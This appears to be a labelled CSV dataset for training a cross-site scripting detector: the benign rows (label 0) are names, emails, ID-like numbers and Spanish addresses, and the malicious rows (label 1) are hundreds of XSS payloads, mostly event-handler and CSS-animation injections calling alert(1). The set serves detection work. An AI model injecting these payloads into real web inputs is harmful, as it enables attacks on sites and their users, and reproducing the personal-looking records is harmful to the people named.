Sentence,Label
44491,0
jabes,0
3.19E+15,0
valentik,0
ba46ea5,0
8322,0
thomaier,0
pilocarpina,0
tibor,0
brooking-doolittle@encuentrodominios.lv,0
62573420b,0
"calle castilla, 142 11?c",0
camas,0
6928,0
8.28E+15,0
schwarz,0
colote,0
delfina,0
querol jopia,0
veguos@schnapps.com.mn,0
23543482s,0
"c/ luarca, 151, 7?g",0
regencs,0
40444,0
5.55E+15,0
11,0
arnone,0
insanable,0
4468,0
kokoska1,0
jusmeter-se,0
fedor,0
sanou bellsol,0
leiding@ubuybetter.cat,0
21840329n,0
"calle francisco gervas, 174, 9h",0
33500,0
9.01E+15,0
pbkim,0
es3regamiento,0
sandybell,0
bogs terradas,0
talmadge@movintel.uz,0
96815806c,0
"c/ secretario guedes aleman s/n,",0
paterna del campo,0
9.83E+15,0
benji,0
6olpeador,0
8318,0
daochuan,0
vir7eino,0
violeta,0
caadillas almendro,0
papadouka_cuttinet@professionalhosting.com.il,0
84411118z,0
"calle dinamarca 14,",0
navas de bureba,0
15175,0
6.29E+15,0
boothroy,0
otorgamiento,0
gabina,0
yamuza ezama,0
hendrika@kayaalicante.sc,0
83320221f,0
"nuestra seora del perpetuo socorro, 125",0
frades de la sierra,0
24711,0
6.34E+15,0
tele,0
su7in1st9ar,0
898,0
lanae,0
4e6qu5r5r,0
maitena,0
urrupan moger,0
teulinks-oakman@941.tr,0
33814848h,0
nuez de balboa 131 2-f,0
belinchn,0
9515,0
1.31E+14,0
ed,0
chichicaste,0
yazmn,0
tiru corominas,0
cesana@lasexta-f1.jm,0
21905566k,0
"passeig de les palmeres, s/n",0
quicena,0
19390,0
2.03E+15,0
8,0
ralina,0
desacertadamente,0
8201,0
arles,0
costana,0
milad,0
laws cabezon,0
buehlmann.mcdonall@qcole.sn,0
29807509s,0
"segura 30,",0
bidaurreta,0
ilya,0
papali$no,0
nedar,0
casasnova vadal,0
klee8@farma-job.fj,0
"c/ zilbetiko monasterioaren, s/n,",0
"pont de bar, el",0
17467,0
7.11E+15,0
lesmeris,0
al9ol,0
2952,0
harshad,0
czarevitz,0
braa,0
tsangas4@16horas.il,0
88918773z,0
calle minerva 66 12?c,0
luquin,0
22532,0
8.75E+15,0
roby,0
rev2elaci3,0
belisaria,0
vilaubi hosta,0
muir-vasilescu5@lodgeinmadrid.ir,0
30097796l,0
muelle de astillero 128 5-b,0
sant esteve sesrovires,0
26223,0
7.67E+15,0
waldon,0
a6br9442,0
7785,0
sadeghi,0
$ventador,0
adam,0
trigo retuerta,0
frison@barnizultravioleta.jm,0
91553356q,0
"carretera aeropuerto, 42,",0
vznar,0
10665,0
1.90E+15,0
rodolphe,0
alfa71ta,0
arimany aguila,0
rapaport.iloloubek@ajuntamentbarcelona20.com,0
35742173n,0
"travesia castilla, 92, 5-g",0
ortuella,0
43746,0
9.85E+15,0
sikes,0
tiramollar,0
4743,0
dugas,0
grandia zarzosa,0
husky_hurlic@ropadegolf.sn,0
19807221n,0
c/ dionisio acebal 41,0
valverde,0
5146,0
2.75E+15,0
elysee,0
ca61u13ia-0,0
jana,0
ablitas vilaregut,0
murad@magadan.org.pe,0
98726186c,0
"c/ pintores zubiaurre, 156,",0
arenillas de riopisuerga,0
39696,0
7.79E+15,0
terencio,0
7198,0
amarjit,0
corazoncill2,0
heraclio,0
80920943c,0
"pl. santa ana, 97,",0
sant jaume dels domenys,0
44368,0
8.08E+15,0
hungkang,0
escudern,0
nayme,0
campi delgados,0
inescourt7@citycvs.mil,0
14188360m,0
"plaa de margarida xirgu 141, 2h",0
bardallur,0
15635,0
1.89E+15,0
gabby,0
bu9ero,0
2191,0
helaina,0
gelogo,0
nella,0
tapies ximenis,0
foulk@eonon.com.es,0
49339665l,0
"sagrada familia 124, 5?b",0
torres de la alameda,0
17130,0
8.34E+15,0
deacetis,0
entolar,0
janet,0
sotorro feo,0
brait_burbridge@fichajes.nom.ic,0
76706902q,0
"calle alfred nobel, 42 7-g",0
peramola,0
12460,0
menna4,0
6608r.lo2uo,0
3549,0
karn,0
h958013a,0
otilio,0
sureda bahamonde,0
yang_lindekens@nightflight.dm,0
28092111a,0
c/ rio elorz 141 11-h,0
itero de la vega,0
3.33E+15,0
bangert,0
5ositi2v9,0
olivio,0
narvarte delgado,0
parola@zonamodelos.pl,0
72588518n,0
"plaza cinco villas, 103,",0
"prats de rei, els",0
16417,0
5.89E+15,0
thorndik9,0
cotizada,0
4233,0
malia,0
tnic1,0
gwynne4@inoxled.kz,0
73002359z,0
"cami can manuel, 117,",0
31383,0
1.78E+15,0
serban,0
tripudio,0
eduardo,0
ortega sacrista,0
93289880v,0
"c/ serrano, 125,",0
sarri de ter,0
22728,0
7.99E+15,0
booth,0
su6sc87u23r,0
3849,0
delli,0
enfardeladora,0
roberto,0
violas,0
02858717r,0
"c/ francisco javier simonet 7, 11?e",0
muskiz,0
49160,0
4.55E+15,0
toinette,0
ma$c3donio,0
tali,0
de tena leguizamn,0
robin@comerciosdeaspe.info,0
83817692b,0
"c/ rio avia, 105, 2?h",0
cantiveros,0
28529,0
8.33E+15,0
bhatti,0
7redil47ta,0
9832,0
maciel,0
f36hu1a,0
clever,0
zachrisson satalia,0
demarco_phuong@beesmer.me,0
"duesaigues 80,",0
beniarj,0
50136,0
1.61E+15,0
swinks8,0
repuesta,0
alek,0
daviu callarisa,0
salerno.harmer@nexuspark.li,0
30584367w,0
"masia can ruti 142, 1-b",0
fuentecantos,0
26532,0
3.55E+15,0
knio,0
tricentenario,0
1008,0
kiri,0
vajil-la,0
radresa tudn,0
sennett@ankawaelda.tr,0
64556150a,0
"chopo, 10",0
palma de cervell la,0
3.32E+15,0
deying,0
c7lifa01,0
albida,0
lema cuartero,0
lenihan.asanachinda@hojainformativas.cf,0
16362236j,0
"moreno lopez, 55, 9-e",0
"granada, la",0
27388,0
1.86E+15,0
ghossein,0
conceptualismo,0
2904,0
peabody,0
a4go37a,0
bernab,0
escalera,0
somer@hotelsardegna.tg,0
"baixada carme, 165, 3?e",0
fontanar,0
5.41E+15,0
karolefs,0
cagarria,0
maisa,0
bubnjar cangalaya,0
lisser-grebeshkova@hipermadrid.lv,0
65472744r,0
"calle azaa, s/n, 10?a",0
hoyocasero,0
45681,0
5.62E+15,0
74,0
domains_,0
empel6tarse,0
6486,0
samieian7,0
e97rep70rn*as,0
victoria,0
marginet,0
gran@fernandosoto.ch,0
84871626q,0
"entrada el zurdo, 166 7?e",0
sisante,0
10328,0
8.75E+15,0
aisha,0
e9951r3nte,0
anselmo,0
bertra canamasa,0
46978547n,0
"los halcones 160,",0
quel,0
9.18E+15,0
67,0
logr_era,0
4210,0
michiel,0
apolilladura,0
ken,0
corts,0
rozsabegyi.kasker@mirata.ls,0
70243797a,0
"grupos 1 y 2 valladolid 178,",0
robledollano,0
34309,0
7.38E+15,0
mitsuter,0
exte69a1i29,0
remberta,0
belver,0
boutigny@maxtienda.mx,0
01449063v,0
calle ramon mario mirazo 46,0
"hinojosa, la",0
13591,0
1.26E+15,0
drabek,0
re1v566i7ator0o,0
3303,0
duplan,0
solicitador,0
silena,0
mar mendivil,0
savelova@grandesinventos.ne,0
36852462e,0
particular teresa orozco 101,0
4.91E+15,0
"<script onclick=""alert(1)"">test</script>",1
<noscript onpointerout=alert(1)>XSS</noscript>,1
<rtc onpointerup=alert(1)>XSS</rtc>,1
<link id=x tabindex=1 onbeforeactivate=alert(1)></link>,1
<source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>,1
"<form onbeforecut=""alert(1)"" contenteditable>test</form>",1
"<audio onkeypress=""alert(1)"" contenteditable>test</audio>",1
"<caption onmouseout=""alert(1)"">test</caption>",1
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",1
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",1
document.scripts.length,1
"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>",1
<iframe onreadystatechange=alert(1)></iframe>,1
"<img ondblclick=""alert(1)"">test</img>",1
"<select onmousemove=""alert(1)"">test</select>",1
"<style>:target {color:red;}</style><content id=x style=""transition:color 1s"" ontransitionend=alert(1)></content>",1
"<br ondblclick=""alert(1)"">test</br>",1
<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>,1
"<style>:target {color: red;}</style><blockquote id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></blockquote>",1
"<time ondblclick=""alert(1)"">test</time>",1
"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",1
"<img onbeforepaste=""alert(1)"" contenteditable>test</img>",1
"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",1
"<pre onmouseenter=""alert(1)"">test</pre>",1
"<listing onkeypress=""alert(1)"" contenteditable>test</listing>",1
<svg><samp onload=alert(1)></samp>,1
"<style>@keyframes slidein {}</style><title style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></title>",1
<em id=x tabindex=1 onfocus=alert(1)></em>,1
"<details onmouseout=""alert(1)"">test</details>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><td id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></td>",1
"<dialog draggable=""true"" ondragend=""alert(1)"">test</dialog>",1
<label id=x tabindex=1 onfocusin=alert(1)></label>,1
"<del onmouseout=""alert(1)"">test</del>",1
<b id=x tabindex=1 onfocus=alert(1)></b>,1
"<select onmouseleave=""alert(1)"">test</select>",1
"<shadow onpaste=""alert(1)"" contenteditable>test</shadow>",1
"<video autoplay onplaying=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" ontransitionend=alert(1)></kbd>",1
"<b onmouseenter=""alert(1)"">test</b>",1
<map onpointerdown=alert(1)>XSS</map>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><kbd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></kbd>",1
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",1
"<style>@keyframes x{}</style><plaintext style=""animation-name:x"" onanimationstart=""alert(1)""></plaintext>",1
"<footer oncontextmenu=""alert(1)"">test</footer>",1
"<small onkeydown=""alert(1)"" contenteditable>test</small>",1
"<div draggable=""true"" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>",1
<svg><kbd onload=alert(1)></kbd>,1
"<style>:target {transform: rotate(180deg);}</style><dialog id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dialog>",1
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,1
<fieldset onblur=alert(1) tabindex=1 id=x></fieldset><input autofocus>,1
<dfn onpointerover=alert(1)>XSS</dfn>,1
<ol onpointerleave=alert(1)>XSS</ol>,1
"<input onkeyup=""alert(1)"" contenteditable>test</input>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><s id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></s>",1
<li onpointerup=alert(1)>XSS</li>,1
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dialog>",1
"<html onmouseleave=""alert(1)"">test</html>",1
"<footer onmousemove=""alert(1)"">test</footer>",1
<source id=x tabindex=1 onfocus=alert(1)></source>,1
"<div draggable=""true"" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>",1
<b onpointerenter=alert(1)>XSS</b>,1
<em id=x tabindex=1 onbeforeactivate=alert(1)></em>,1
"<form><a href=""javascript:\u0061lert(1)"">X",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></ol>",1
"<object onmousemove=""alert(1)"">test</object>",1
<progress onpointermove=alert(1)>XSS</progress>,1
"<style>:target {color: red;}</style><s id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></s>",1
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationstart=""alert(1)""></noframes>",1
<marquee onpointerup=alert(1)>XSS</marquee>,1
"<a draggable=""true"" ondragstart=""alert(1)"">test</a>",1
<base onpointerdown=alert(1)>XSS</base>,1
"<style>:target {transform: rotate(180deg);}</style><ins id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ins>",1
"<rp onmouseover=""alert(1)"">test</rp>",1
<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,1
"<figcaption onbeforecopy=""alert(1)"" contenteditable>test</figcaption>",1
"<style>:target {transform: rotate(180deg);}</style><svg id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></svg>",1
"<style>:target {transform: rotate(180deg);}</style><tfoot id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tfoot>",1
"<big draggable=""true"" ondrag=""alert(1)"">test</big>",1
"<noframes ondblclick=""alert(1)"">test</noframes>",1
<tfoot onpointerenter=alert(1)>XSS</tfoot>,1
<rtc id=x tabindex=1 onfocus=alert(1)></rtc>,1
"<h1 onbeforepaste=""alert(1)"" contenteditable>test</h1>",1
"<map onkeydown=""alert(1)"" contenteditable>test</map>",1
<data onpointermove=alert(1)>XSS</data>,1
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>",1
"<center onbeforepaste=""alert(1)"" contenteditable>test</center>",1
"<bdo onmouseover=""alert(1)"">test</bdo>",1
"<div draggable=""true"" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn>",1
"<hr onkeyup=""alert(1)"" contenteditable>test</hr>",1
<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>,1
<isindex type=image onload=alert(1) src=validimage.png>,1
<SCRIPT>alert('')</SCRIPT>,1
<strike onpointerout=alert(1)>XSS</strike>,1
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",1
<object id=x tabindex=1 onbeforedeactivate=alert(1)></object><input autofocus>,1
"<frame onmouseup=""alert(1)"">test</frame>",1
<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>,1
<ins onpointermove=alert(1)>XSS</ins>,1
<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>,1
"<a onmouseleave=""alert(1)"">test</a>",1
"<div draggable=""true"" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>",1
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,1
"<dt onbeforecopy=""alert(1)"" contenteditable>test</dt>",1
"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>",1
document.URL,1
"<element ondblclick=""alert(1)"">test</element>",1
<noframes onpointermove=alert(1)>XSS</noframes>,1
"<div onbeforecut=""alert(1)"" contenteditable>test</div>",1
"<div draggable=""true"" contenteditable>drag me</div><footer ondragover=alert(1) contenteditable>drop here</footer>",1
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",1
"<style>:target {color: red;}</style><small id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></small>",1
"<title draggable=""true"" ondrag=""alert(1)"">test</title>",1
"<th onpaste=""alert(1)"" contenteditable>test</th>",1
"<p onbeforecut=""alert(1)"" contenteditable>test</p>",1
"<style>@keyframes x{}</style><embed style=""animation-name:x"" onanimationend=""alert(1)""></embed>",1
<figure onblur=alert(1) tabindex=1 id=x></figure><input autofocus>,1
"<section onbeforecopy=""alert(1)"" contenteditable>test</section>",1
"<style>:target {color:red;}</style><select id=x style=""transition:color 1s"" ontransitionend=alert(1)></select>",1
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",1
document.documentElement.nodeName,1
<blink id=x tabindex=1 onactivate=alert(1)></blink>,1
"<mark onmouseup=""alert(1)"">test</mark>",1
"<embed onmouseleave=""alert(1)"">test</embed>",1
"<col draggable=""true"" ondragleave=""alert(1)"">test</col>",1
"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationend=""alert(1)""></ins>",1
"<thead onclick=""alert(1)"">test</thead>",1
"<select onkeydown=""alert(1)"" contenteditable>test</select>",1
"<th draggable=""true"" ondragleave=""alert(1)"">test</th>",1
"<ruby draggable=""true"" ondragenter=""alert(1)"">test</ruby>",1
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,1
"<dir draggable=""true"" ondrag=""alert(1)"">test</dir>",1
"<select onbeforecopy=""alert(1)"" contenteditable>test</select>",1
<dd onpointerenter=alert(1)>XSS</dd>,1
"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",1
"<dt onkeypress=""alert(1)"" contenteditable>test</dt>",1
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",1
"<xmp onmouseout=""alert(1)"">test</xmp>",1
"<optgroup onbeforecopy=""alert(1)"" contenteditable>test</optgroup>",1
"<var oncut=""alert(1)"" contenteditable>test</var>",1
"<link onpaste=""alert(1)"" contenteditable>test</link>",1
<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>,1
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",1
<article onpointerenter=alert(1)>XSS</article>,1
"<rb onbeforecopy=""alert(1)"" contenteditable>test</rb>",1
<source id=x tabindex=1 onbeforeactivate=alert(1)></source>,1
<strike onpointermove=alert(1)>XSS</strike>,1
"document.getElementsByName("""")",1
"<frame oncopy=""alert(1)"" contenteditable>test</frame>",1
"<style>@keyframes x{}</style><sup style=""animation-name:x"" onanimationend=""alert(1)""></sup>",1
<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>,1
<picture onpointerenter=alert(1)>XSS</picture>,1
"<legend draggable=""true"" ondragleave=""alert(1)"">test</legend>",1
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>,1
"<title oncopy=""alert(1)"" contenteditable>test</title>",1
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,1
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",1
"<rb onpaste=""alert(1)"" contenteditable>test</rb>",1
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationstart=""alert(1)""></tt>",1
"<input onkeypress=""alert(1)"" contenteditable>test</input>",1
"<video oncontextmenu=""alert(1)"">test</video>",1
<animate onpointerdown=alert(1)>XSS</animate>,1
"<input onselect=alert(1) value=""XSS"" autofocus>",1
"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",1
"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",1
"<rb oncopy=""alert(1)"" contenteditable>test</rb>",1
"<multicol onmouseleave=""alert(1)"">test</multicol>",1
<title onpointerover=alert(1)>XSS</title>,1
"<option draggable=""true"" ondragend=""alert(1)"">test</option>",1
"<nextid oncut=""alert(1)"" contenteditable>test</nextid>",1
"<dfn onbeforecopy=""alert(1)"" contenteditable>test</dfn>",1
"<tr onkeydown=""alert(1)"" contenteditable>test</tr>",1
"<object oncontextmenu=""alert(1)"">test</object>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blockquote id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blockquote>",1
"<style>:target {color: red;}</style><blink id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></blink>",1
"<nextid onkeydown=""alert(1)"" contenteditable>test</nextid>",1
"<span onkeyup=""alert(1)"" contenteditable>test</span>",1
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",1
"<frameset draggable=""true"" ondragenter=""alert(1)"">test</frameset>",1
<dd onpointerup=alert(1)>XSS</dd>,1
"<ins onkeypress=""alert(1)"" contenteditable>test</ins>",1
"<option onmouseleave=""alert(1)"">test</option>",1
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onanimationend=""alert(1)""></ul>",1
"<picture onmousedown=""alert(1)"">test</picture>",1
"<data onbeforecopy=""alert(1)"" contenteditable>test</data>",1
"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationstart=""alert(1)""></details>",1
<header onpointerleave=alert(1)>XSS</header>,1
"<ins onbeforecut=""alert(1)"" contenteditable>test</ins>",1
"<picture onpaste=""alert(1)"" contenteditable>test</picture>",1
<rb onpointerup=alert(1)>XSS</rb>,1
"<marquee onclick=""alert(1)"">test</marquee>",1
<big onpointerout=alert(1)>XSS</big>,1
"<style draggable=""true"" ondragend=""alert(1)"">test</style>",1
<details id=x tabindex=1 onfocusin=alert(1)></details>,1
<object onpointerover=alert(1)>XSS</object>,1
<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>,1
"<style>@keyframes slidein {}</style><meta style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meta>",1
<data onpointerover=alert(1)>XSS</data>,1
"<rb draggable=""true"" ondragstart=""alert(1)"">test</rb>",1
<template onpointerdown=alert(1)>XSS</template>,1
<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>,1
"<div draggable=""true"" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>",1
<strike id=x tabindex=1 onfocusin=alert(1)></strike>,1
"<br onclick=""alert(1)"">test</br>",1
"<div draggable=""true"" ondragend=""alert(1)"">test</div>",1
<i onpointerout=alert(1)>XSS</i>,1
<animatemotion onpointerout=alert(1)>XSS</animatemotion>,1
"<div draggable=""true"" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>",1
<input autofocus onfocusin=alert(1)>,1
<i id=x tabindex=1 onactivate=alert(1)></i>,1
"<wbr onmousedown=""alert(1)"">test</wbr>",1
"<img oncontextmenu=""alert(1)"">test</img>",1
<progress id=x tabindex=1 onfocusin=alert(1)></progress>,1
<kbd onpointerleave=alert(1)>XSS</kbd>,1
<svg><base onload=alert(1)></base>,1
<p onpointerover=alert(1)>XSS</p>,1
"<rp onbeforepaste=""alert(1)"" contenteditable>test</rp>",1
"<style>@keyframes slidein {}</style><figcaption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figcaption>",1
<pre onpointerout=alert(1)>XSS</pre>,1
"<body onmouseleave=""alert(1)"">test</body>",1
"<BGSOUND SRC=""javascript:alert('');"">",1
<track onpointerout=alert(1)>XSS</track>,1
"<select onkeypress=""alert(1)"" contenteditable>test</select>",1
<frame onpointerdown=alert(1)>XSS</frame>,1
<fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>,1
<aside id=x tabindex=1 onactivate=alert(1)></aside>,1
<marquee id=x tabindex=1 onfocusin=alert(1)></marquee>,1
"<applet onmouseup=""alert(1)"">test</applet>",1
"<main onmouseover=""alert(1)"">test</main>",1
<span onpointerleave=alert(1)>XSS</span>,1
<dl id=x tabindex=1 onfocusin=alert(1)></dl>,1
"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",1
"<var onmouseleave=""alert(1)"">test</var>",1
"<noscript draggable=""true"" ondragend=""alert(1)"">test</noscript>",1
"<track ondblclick=""alert(1)"">test</track>",1
<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,1
"<base onkeydown=""alert(1)"" contenteditable>test</base>",1
"<style>@keyframes slidein {}</style><label style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></label>",1
"<img draggable=""true"" ondrag=""alert(1)"">test</img>",1
"<picture onbeforepaste=""alert(1)"" contenteditable>test</picture>",1
<html onpointerup=alert(1)>XSS</html>,1
"<meta onkeypress=""alert(1)"" contenteditable>test</meta>",1
<thead onpointerenter=alert(1)>XSS</thead>,1
"<rb onclick=""alert(1)"">test</rb>",1
<hgroup onpointerleave=alert(1)>XSS</hgroup>,1
<select id=x tabindex=1 onactivate=alert(1)></select>,1
"<div draggable=""true"" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>",1
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationstart=""alert(1)""></hr>",1
"<var draggable=""true"" ondrag=""alert(1)"">test</var>",1
<menu onpointerout=alert(1)>XSS</menu>,1
<multicol onpointerenter=alert(1)>XSS</multicol>,1
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>",1
"<blink draggable=""true"" ondragleave=""alert(1)"">test</blink>",1
"<select onmouseup=""alert(1)"">test</select>",1
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,1
<small onpointerleave=alert(1)>XSS</small>,1
<script onpointerenter=alert(1)>XSS</script>,1
<mark onpointerenter=alert(1)>XSS</mark>,1
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>,1
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationend=""alert(1)""></img>",1
"<style>:target {transform: rotate(180deg);}</style><s id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></s>",1
"<dt oncopy=""alert(1)"" contenteditable>test</dt>",1
"<applet onmousemove=""alert(1)"">test</applet>",1
<br onpointerdown=alert(1)>XSS</br>,1
"<base onbeforecut=""alert(1)"" contenteditable>test</base>",1
"<style>:target {transform: rotate(180deg);}</style><big id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></big>",1
"<address onbeforepaste=""alert(1)"" contenteditable>test</address>",1
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionend=alert(1)></shadow>",1
"<isindex onkeyup=""alert(1)"" contenteditable>test</isindex>",1
<strong onpointerdown=alert(1)>XSS</strong>,1
<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>",1
<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>,1
"<style>@keyframes x{}</style><frameset style=""animation-name:x"" onanimationstart=""alert(1)""></frameset>",1
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,1
"<style>@keyframes slidein {}</style><samp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></samp>",1
<a onpointerout=alert(1)>XSS</a>,1
"<dd ondblclick=""alert(1)"">test</dd>",1
"<small onclick=""alert(1)"">test</small>",1
<dir onpointerover=alert(1)>XSS</dir>,1
<svg><output onload=alert(1)></output>,1
<select onpointerleave=alert(1)>XSS</select>,1
"<div draggable=""true"" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>",1
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",1
<svg><header onload=alert(1)></header>,1
"<picture><source srcset=""validimage.png""><img onloadstart=alert(1)></picture>",1
<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>,1
"<pre onbeforecut=""alert(1)"" contenteditable>test</pre>",1
"<menuitem onmouseenter=""alert(1)"">test</menuitem>",1
<html onpointerover=alert(1)>XSS</html>,1
<canvas onpointerenter=alert(1)>XSS</canvas>,1
<hgroup onpointerout=alert(1)>XSS</hgroup>,1
"<style>:target {color:red;}</style><dt id=x style=""transition:color 1s"" ontransitionend=alert(1)></dt>",1
"<p draggable=""true"" ondrag=""alert(1)"">test</p>",1
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,1
<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,1
"<div draggable=""true"" contenteditable>drag me</div><fieldset ondragover=alert(1) contenteditable>drop here</fieldset>",1
<strike onpointerdown=alert(1)>XSS</strike>,1
